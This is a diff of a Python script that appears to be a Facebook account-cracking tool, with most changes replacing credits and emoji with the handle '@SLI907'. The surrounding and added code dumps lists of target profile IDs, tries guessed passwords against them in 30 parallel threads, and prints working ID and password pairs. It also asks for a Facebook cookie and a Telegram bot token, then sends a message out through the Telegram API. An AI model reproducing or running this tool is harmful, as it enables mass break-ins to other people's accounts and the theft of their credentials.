@@ -81,7 +81,7 @@ print('''
  ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
   ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀  ⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀      
- ⢤⣀🔥⣀⣀⠀⢸⣷⡄🔥⣁⣀⣤⣴⣿⣿⣿⣆      
+ ⢤⣀⣀⣀⠀⢸⣷⡄⣁⣀⣤⣴⣿⣿⣿⣆      
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿        
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟      
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
@@ -90,12 +90,12 @@ print('''
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀  ⠀    
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿ ⠀      ⠀⠀⠀
 ⠀''')
-print('__________  @SLI907❤️‍🔥💦────────')
+print('__________  @SLI907────────')
 print('')
-token = input(' \033[2;36m  𝕋𝕆𝕂𝔼𝕟  ')
-print(('\033[1;33m╼'*40)+'\n• hobby ❤️‍🔥 |  •@e_h_a_b_5 |  hobby ❤️‍🔥 \n'+('╾'*40))
-ID = input('\033[2;36m  𝕀𝔻  ')
-tlg1 = '\n  @SLI907 ❤️‍🔥 🔥🤑\n@SLI907 • me user telegram ➪ •————————————\n ────────⧏ @SLI907❤️‍🔥 ⧐────────\n  🤑🔥  ➩ \n  @SLI907 ❤️‍🔥 \n    \n @SLI907   -  @SLI907\n\n────────⧏  RDF ❤️‍🔥⧐──────── '
+token = input(' \033[2;36m  Enter your Token bot Telegram  ')
+print(('\033[1;33m╼'*40)+'\n• @SLI907 |  •@SLI907 |  @SLI907 \n'+('╾'*40))
+ID = input('\033[2;36m  Enter you ID Telegram  ')
+tlg1 = '\n  @SLI907 \n@SLI907 • me user telegram ➪ •————————————\n ────────⧏ @SLI907 ⧐────────\n    ➩ \n  @SLI907  \n    \n @SLI907   -  @SLI907\n\n────────⧏  RDF ⧐──────── '
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
 os.system('clear')
 cetak(nel('\t• @SLI907  •'))
@@ -213,7 +213,7 @@ def back():
 
 def banner():
     print(f'''\t{asu}''')
-    print(('\033[1;33m╼'*40)+'\n• ehab dahi❤️‍🔥 | @SLI907 • | @SLI907 \n'+('╾'*40))
+    print(('\033[1;33m╼'*40)+'\n• @SLI907 | @SLI907 • | @SLI907 \n'+('╾'*40))
 def ddfmot0():
     try:
         token = open('.dd.txt','r').read()
@@ -240,7 +240,7 @@ def login_lagi334():
         
         asu = random.choice([m,k,h,b,u])
         os.system('clear')
-        print(('\033[1;33m╼'*40)+'\n• ehab dahi❤️‍🔥 |  • | @SLI907\n'+('╾'*40))
+        print(('\033[1;33m╼'*40)+'\n• @SLI907 |  • | @SLI907\n'+('╾'*40))
         cookie=input(f'  [{h}•{x}]Cookies :{asu} ')
         open(".ddfmoto.txt", "w").write(cookie)
         with requests.Session() as rsn:
@@ -299,11 +299,11 @@ def menu(my_name,my_id):
     print(''''
  
  \033[95m
-Welcom To Tool  ⌁[@SLI907 🦅 💀]⌁
+Welcom To Tool  ⌁[@SLI907 ]⌁
 
 --------------------------------------------------------
-ehab dahi❤️‍🔥•••⌁[SLI907]
-USER Telegram💦:@SLI907
+@SLI907•••⌁[SLI907]
+USER Telegram:@SLI907
 
 𓆩⌁[SLI907]⌁𓆪
 
@@ -311,7 +311,7 @@ USER Telegram💦:@SLI907
 --------------------------------------------------------''')
     print('')
     print('\033[2;36m╰─ 1. Crack Publik ⇛"Your friend ')
-    print(('\033[1;33m╼'*40)+'\n• ehab dahi❤️‍🔥 | @SLI907 •\n'+('╾'*40))
+    print(('\033[1;33m╼'*40)+'\n• @SLI907 | @SLI907 •\n'+('╾'*40))
     print('\033[2;36m╰─ 0. login out ⇛" edit Cookies    ')
     _____alvino__adijaya_____ = input('\n>> chose : ')
     if _____alvino__adijaya_____ in ['1']:
@@ -330,7 +330,7 @@ USER Telegram💦:@SLI907
         print('>> Done Logout+Hapus Kukis ')
         exit()
     else:
-        print('>> ehab dahi BENAR ')
+        print('>> @SLI907 ')
         back()
 def error():
     print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
@@ -434,7 +434,7 @@ def result():
     else:
         print('>> Pilih Yang Bener Bang ')
         back()
-#-------------------[ ارحبو اداة @SLI907 🦅 ]----------------#
+#-------------------[   @SLI907  ]----------------#
 def dump_massal():
     try:
         token = open('.dd.txt','r').read()
@@ -442,7 +442,7 @@ def dump_massal():
     except IOError:
         exit()
     try:
-        print(('\033[1;33m╼'*40)+'\n• RDF TOL❤️‍🔥 | @SLI907• | @SLI907\n'+('╾'*40))
+        print(('\033[1;33m╼'*40)+'\n• RDF TOL | @SLI907• | @SLI907\n'+('╾'*40))
         jum = int(input('\033[2;36m>> TARGET ID ?1-10000 ID  : '))
     except ValueError:
         print('>> Masukkan Angka Anjing, Malah Huruff ')
@@ -489,7 +489,7 @@ def dump_massal():
     try:
         print('')
         print(X+'────────────────────────')
-        print(f'\033[2;36m ⇛ ID : عدد الايديات {h}'+str(len(id)))
+        print(f'\033[2;36m ⇛ ID : Enter number ID Profile Facebook {h}'+str(len(id)))
         setting()
     except requests.exceptions.ConnectionError:
         print(f'{G}')
@@ -501,7 +501,7 @@ def dump_massal():
         back()
 
 def setting():
-    print(('\033[1;33m╼'*40)+'\n• RDF TOL❤️‍🔥 | @SLI907 • | @RDF_TOLS\n'+('╾'*40))
+    print(('\033[1;33m╼'*40)+'\n• 1 | @SLI907 • | @SLI907\n'+('╾'*40))
     print(f'\033[2;36m» 1- 𝐈𝐃 𝐎𝐋𝐃 | old accont ')
     print('\033[2;36m» 2- 𝐈𝐃 𝐍𝐄𝐖 | new accont ')
     print('\033[2;36m» 3- 𝐎𝐋𝐃+𝐍𝐄𝐖 | old+new ')
@@ -568,7 +568,7 @@ def setting():
     passwrd()
 
 def passwrd():
-    print(('\033[1;33m╼'*40)+'\n• ehab dahi❤️‍🔥 | @SLI907• |@SLI907\n'+('╾'*40))
+    print(('\033[1;33m╼'*40)+'\n• @SLI907 | @SLI907• |@SLI907\n'+('╾'*40))
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -698,7 +698,7 @@ def passwrd():
             else:
                 pool.submit(crackmbasic,idf,pwv)
     print('')
-    cetak(nel('\t[ehab😉]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+    cetak(nel('\t[@SLI907]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
     print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
     print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
     print('')
@@ -735,17 +735,17 @@ def crack(idf,pwv):
                     akun.append(idf+'|'+pw)
                     ceker(idf,pw)
                 else:
-                    print(('\033[1;33m╼'*40)+'\n• RDF TOL❤️‍🔥 | @aliiii101 • | @RDF_TOLS\n'+('╾'*40))
+                    print(('\033[1;33m╼'*40)+'\n•  | @SLI907 • | \n'+('╾'*40))
                     statuscp = f'''  
                    
 Other than that - Working ❳
-▬▬▬▬▬▬▬▬ @SLI907 🦅 ✓✯▬▬▬▬▬▬    
+▬▬▬▬▬▬▬▬ @SLI907  ✓✯▬▬▬▬▬▬    
 
   ★- 𝐈𝐃 ➛ {idf}\n
 
   ★ - 𝐏𝐀𝐒𝐒 ➛ {pw}\n
   
-▬▬▬▬▬▬▬ @SLI907 🦅 ✯▬▬▬▬▬▬    
+▬▬▬▬▬▬▬ @SLI907  ✯▬▬▬▬▬▬    
  𝐁𝐘 : @SLI907
 
  '''
@@ -766,14 +766,14 @@ Other than that - Working ❳
                     print(('\x1b[38;5;48m—'*40)+'\n• RDF TOLS | @aliiii101 • | @s1l0k\n'+('—'*40))
                     statusok = f''' 
                   
-✅⪧ ❲ Working ❳
-▬▬▬▬▬▬▬ @SLI907 🦅 ▬▬▬▬▬▬    
+⪧ ❲ Working ❳
+▬▬▬▬▬▬▬ @SLI907  ▬▬▬▬▬▬    
 
   ★- 𝐈𝐃 ➛ {idf}\n
 
   ★ - 𝐏𝐀𝐒𝐒 ➛ {pw}\n
   
-▬▬▬▬▬▬▬▬  @SLI907 🦅 ✯▬▬▬▬▬▬    
+▬▬▬▬▬▬▬▬  @SLI907  ✯▬▬▬▬▬▬    
  𝐁𝐘 : @SLI907
 
   '''
@@ -816,13 +816,13 @@ Other than that - Working ❳
                     infoakun += f'''
 
 ⪧ ❲ Working ❳
-▬▬▬▬▬▬▬ @SLI907 🦅 ▬▬▬▬▬▬    
+▬▬▬▬▬▬▬ @SLI907  ▬▬▬▬▬▬    
 
   ★- 𝐈𝐃 ➛ {idf}\n
 
   ★ - 𝐏𝐀𝐒𝐒 ➛ {pw}\n
   
-▬▬▬▬▬▬▬✯ @SLI907 🦅 ✯▬▬▬▬▬▬    
+▬▬▬▬▬▬▬✯ @SLI907  ✯▬▬▬▬▬▬    
  𝐁𝐘 : @SLI907
 
 '''
@@ -859,13 +859,13 @@ Other than that - Working ❳
                     statusok = f'''                    
 
 ⪧ ❲ Working ❳
-▬▬▬▬▬▬▬ @SLI907 🦅 ▬▬▬▬▬▬    
+▬▬▬▬▬▬▬ @SLI907  ▬▬▬▬▬▬    
 
   ★- 𝐈𝐃 ➛ {idf}\n
 
   ★ - 𝐏𝐀𝐒𝐒 ➛ {pw}\n
   
-▬▬▬▬▬▬▬▬  @SLI907🦅✯▬▬▬▬▬▬    
+▬▬▬▬▬▬▬▬  @SLI907 ✯▬▬▬▬▬▬    
  𝐁𝐘 : @ @SLI907
                     
                     '''
@@ -915,7 +915,7 @@ def cek_dd(kuki):
     except AttributeError:
         print ("\r    %s \033[0mcookie invalid"%(M))
 
-#-----------------------  @SLI907 🦅 ]--------------------#
+#-----------------------  @SLI907  ]--------------------#
 if __name__=='__main__':
     try:os.system('git pull')
     except:pass
